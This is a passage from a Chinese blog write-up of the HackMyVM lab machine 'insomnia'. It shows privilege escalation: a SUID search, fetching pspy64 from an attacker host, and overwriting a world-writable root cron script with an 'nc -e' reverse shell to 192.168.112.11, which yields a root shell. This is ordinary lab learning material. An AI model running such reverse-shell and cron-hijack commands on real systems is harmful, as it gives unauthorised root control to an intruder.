+<p> 成功拿到用户的shell<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> julia<span class="variable">@insomnia</span>:<span class="regexp">/var/www</span><span class="regexp">/html$ find /</span> -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/de&lt;ml$ find /</span> -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev                        /null</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chfn</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/su</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br></pre></td></tr></table></figure></div><br>suid没东西 再从本地上传pspy64 看看有没有定时任务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">julia@insomnia:~$ wget <span class="number">192.168</span>.<span class="number">112.11</span><span class="symbol">/pspy64</span></span><br><span class="line"><span class="operator">-</span>-<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">4</span>0--  http:<span class="symbol">//192.168.112.11/pspy64</span></span><br><span class="line">Connecting to <span class="number">192.168</span>.<span class="number">112.11</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"><span class="params">Length:</span> <span class="number">3104768</span> (<span class="number">3.0</span>M) [application<span class="operator">/</span>octet-stream]</span><br><span class="line">Saving <span class="params">to:</span> ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64             <span class="number">100</span>%[<span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span><span class="operator">&gt;</span>]   <span class="number">2.96</span>M  <span class="operator">-</span>-.-KB<span class="symbol">/s</span>    <span class="keyword">in</span> <span class="number">0.09</span>s   </span><br><span class="line"></span><br><span class="line"><span class="number">202</span>5-<span class="number">0</span>2-<span class="number">16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">40</span> (<span class="number">34.1</span> MB<span class="operator">/</span>s) <span class="operator">-</span> ‘pspy64’ saved [<span class="number">3104768</span><span class="operator">/</span><span class="number">3104768</span>]</span><br><span class="line"></span><br><span class="line">julia@insomnia:~$ chmod <span class="operator">=</span>x    ^C</span><br><span class="line">julia@insomnia:~$ chmoc ^C</span><br><span class="line">julia@insomnia:~$ chmod <span class="operator">+</span>x pspy64</span><br><span class="line">julia@insomnia:~$ <span class="symbol">./pspy64</span></span><br><span class="line"></span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">58</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">2</span>      | </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">58</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">1</span>      | <span class="symbol">/sbin/init</span> </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">766</span>    | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">767</span>    | <span class="symbol">/usr/sbin/CRON</span> <span class="operator">-</span>f </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">768</span>    | <span class="symbol">/bin/sh</span> <span class="operator">-</span>c    <span class="symbol">/bin/bash</span> <span class="symbol">/var/cron/check.sh</span> </span><br><span class="line"><span class="number">2025</span><span class="symbol">/02/16</span> <span class="number">08</span>:<span class="number">01</span>:<span class="number">01</span> <span class="params">CMD:</span> UID<span class="operator">=</span><span class="number">0</span>     PID<span class="operator">=</span><span class="number">769</span>    | <span class="symbol">/bin/bash</span> <span class="symbol">/var/cron/check.sh</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>发现root真的会执行一个定时任务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="D"><figure class="iseeu highlight /d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">julia<span class="keyword">@insomnia</span>:~$ cat /var/cron/check.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">status=$(systemctl <span class="keyword">is</span>-active insomnia.service)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$status&quot;</span> == <span class="string">&quot;active&quot;</span>  ]; then</span><br><span class="line">   echo <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   systemctl start  insomnia.service</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></div>
+<p>这个文件也有权限</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">julia@insomnia:/var/cron$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 13 </span>root root<span class="number"> 4096 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>..</span><br><span class="line">-rwxrwxrwx <span class="number"> 1 </span>root root <span class="number"> 153 </span>Dec<span class="number"> 21 </span><span class="number"> 2020 </span>check.sh</span><br></pre></td></tr></table></figure></div>
+<p>和刚才用户一样的思路，直接写反弹shell让root执行拿到root的shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">julia<span class="variable">@insomnia</span><span class="symbol">:/var/cron</span><span class="variable">$ </span>echo <span class="string">&quot;nc -e 192.168.112.11 1234 /bin/bash&quot;</span> &gt; check.sh</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>又学习了目录扫描时候的一些操作，比如加上后缀，接受特定的状态码，然后是php的参数注入，加强wfuzz这个工具的利用<br>后面提权的部分还是很简单的，都是可以写入的文件，还是root的</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/50600.html" title="HMV-insomnia">https://guayu-kakeru.github.io/posts/50600.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/62818.html" rel="prev" title="寒假总结">
+      <i class="fa fa-chevron-left"></i> 寒假总结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/38113.html" rel="next" title="SWPUCTF_2022新生赛(web)WP">
+      SWPUCTF_2022新生赛(web)WP <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
